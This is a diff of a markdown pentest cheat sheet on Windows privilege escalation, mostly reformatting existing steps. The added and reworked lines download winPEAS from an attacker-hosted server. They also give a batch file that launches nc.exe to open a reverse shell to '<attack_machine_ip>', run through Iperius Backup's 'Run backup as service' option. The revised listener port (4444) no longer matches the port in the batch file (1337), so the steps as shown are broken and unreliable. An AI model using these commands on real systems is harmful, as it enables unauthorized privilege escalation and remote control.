@@ -57,7 +57,10 @@ impacket-psexec username:password@<target-ip>
             ```powershell
             cd \Users\<user-name>\Desktop
             powershell
+
             Invoke-WebRequest -Uri http://<your-local-ip>:8000/winPEAS.bat -OutFile .\winPEAS.bat
+            # or
+            curl http://<your-local-ip>:8000/winPEAS.bat -o .\winPEAS.bat
             ```
 
         3. **Execute the WinPEAS**
@@ -456,56 +459,59 @@ AD CS is vulnerable to privilege escalation.
 
     You can find all local users.
 
-    ```
-    1. Search and open "computer management".
-    2. Click "Local Users and Groups".
+    1. **Search and open "computer management"**
 
-    <Users>
-    1. Click "Users".
-    2. Double-click each user to get details e.g. "Member Of".
+    2. **Click "Local Users and Groups"**
 
-    <Groups>
-    1. Click "Groups".
-    2. Double-click each group.
-    3. Attempt to add new user in the group. In most cases, however, it should do as administrator.
-    ```
+    - **Users**
+
+        1. **Click "Users"**
+
+        2. **Double-click each user to get details e.g. "Member Of"**
+
+    - **Groups**
+
+        1. **Click "Groups"**
+
+        2. **Double-click each group**
+
+        3. **Attempt to add new user in the group. In most cases, however, it should do as administrator.**
 
 2. **Disk Management**
 
     Check partitions with it.
 
-    ```sh
-    1. Open the 'Disk Management'.
-    2. Right click the partition to view the properties.
-    3. Check 'Security' tab or 'Shadow Copies' tab.
+    1. **Open the 'Disk Management'**
 
-    # To see the pertion in Windows Explorer
-    1. Right click the partition and click 'Change Drive Letter and Paths'
-    2. Open dialog.
-    3. Click 'Add'. In the dropdown, choose a letter (ex. Z:) and click 'OK'.
-    4. At the top, in the Volume column, you should see that the partition has a letter (Z:) assigned to.
-    5. Open Windows Explorer and check if Z: exists on 'This PC'.
-    6. Click the partition (Z:) and click 'View' tab at the top then check 'Hidden Items'.
+    2. **Right click the partition to view the properties**
 
-    # Restore the previous version of partition
-    1. Right click the partition and click 'Properties' -> 'Previous Versions'.
-    2. Select shadow copy you want to restore and click 'Restore'. The Confirmation popup open, then click 'Restore'.
-    ```
+    3. **Check 'Security' tab or 'Shadow Copies' tab**
+
+    - **Check Partition in Windows Explorer**
+
+        1. Right click the partition and click 'Change Drive Letter and Paths'
+        2. Open dialog.
+        3. Click 'Add'. In the dropdown, choose a letter (ex. Z:) and click 'OK'.
+        4. At the top, in the Volume column, you should see that the partition has a letter (Z:) assigned to.
+        5. Open Windows Explorer and check if Z: exists on 'This PC'.
+        6. Click the partition (Z:) and click 'View' tab at the top then check 'Hidden Items'.
+
+    - **Restore the previous version of partition**
+
+        1. Right click the partition and click 'Properties' -> 'Previous Versions'
+        2. Select shadow copy you want to restore and click 'Restore'. The Confirmation popup open, then click 'Restore'.
 
 3. **Event Viewer**
 
     It lets administrators and users view the event logs on a local or remote machine.
 
-    ```
     1. Search and open "Event Viewer".
-    ```
 
 4. **FullEventLogview**
 
-    ```sh
-    # Search event logs
-    1. Open "Advanced Options".
-    ```
+    - **Search Event Logs**
+
+        1. Open "Advanced Options".
 
 5. **Sysinternals**
 
@@ -540,45 +546,39 @@ AD CS is vulnerable to privilege escalation.
 
     Iperius is vulnerable to privilege escalation.
 
-    ```sh
-    # On target windows machine
+    1. **Check if Iperius is Running in Target Machine**
 
-    # Check if Iperius is running
-    wmic service list | findstr "Iperius"
+        ```sh
+        wmic service list | findstr "Iperius"
+        ```
 
-    # Create a .bat file (ex. "exploit.bat") and place it to Desktop.
-    # When saving, be sure to save it as the file type "All Files". (NOT Text Documents (*.txt))
-    @echo off
-    C:\Users\<USERNAME>\Downloads\nc.exe <attack_machine_ip> 1337 -e exploit.exe
+    2. **Create a .bat file (ex. "exploit.bat") and place it to Desktop.**
 
+        When saving, be sure to save it as the file type "All Files". (NOT Text Documents (*.txt))
 
-    # ----------------------------------------------------------
+        ```powershell
+        @echo off
+        C:\Users\<USERNAME>\Downloads\nc.exe <attack_machine_ip> 1337 -e exploit.exe
+        ```
 
-    # On attack machine
+    3. **Open Listener in Local Machine**
 
-    # Open listener...
-    nc -lvnp 1337
+        ```sh
+        nc -lvnp 4444
+        ```
 
-    # ----------------------------------------------------------
+    4. **Settings in Target Machine**
 
-    # On target windows machine
+        1. Click "Iperius" icon in Windows Explorer (path: C:\Program Files (x86)\Iperius Backup\Iperius).
+        2. Right click the "Iperius" icon on the right-bottom of the bar to open it.
+        3. Click "Create New Backup" and select "Add Folder".
+        4. Enter path (c:\Users\<USERNAME>\Documents) and click "OK".
+        5. Navigate to "Destination" tab and select "Add Destination Folder".
+        7. Enter path (c:\Users\<USERNAME>\Descktop) and click "OK".
+        8. Navigate to "Other Processes" tab.
+        9. On "Before backup" section, check "Run a program or open external file:" and select "exploit.bat" file.
 
-    # Settings
-    1. Click "Iperius" icon in Windows Explorer (path: C:\Program Files (x86)\Iperius Backup\Iperius).
-    2. Right click the "Iperius" icon on the right-bottom of the bar to open it.
-    3. Click "Create New Backup" and select "Add Folder".
-    4. Enter path (c:\Users\<USERNAME>\Documents) and click "OK".
-    5. Navigate to "Destination" tab and select "Add Destination Folder".
-    7. Enter path (c:\Users\<USERNAME>\Descktop) and click "OK".
-    8. Navigate to "Other Processes" tab.
-    9. On "Before backup" section, check "Run a program or open external file:" and select "exploit.bat" file.
+        - **Run**
+            On "Iperius Backup" window, right-click on backup jobs "Documents" and select "Run backup as service" then click "OK" on the dialog.
 
-    # Run 
-    On "Iperius Backup" window, right-click on backup jobs "Documents" and select "Run backup as service" then click "OK" on the dialog.
-
-
-    # -----------------------------------------------------
-
-    # On attack machine
-    Now you should see an incoming connection.
-    ```
+    5. **Check if Incoming Connection Established in Local Machine**
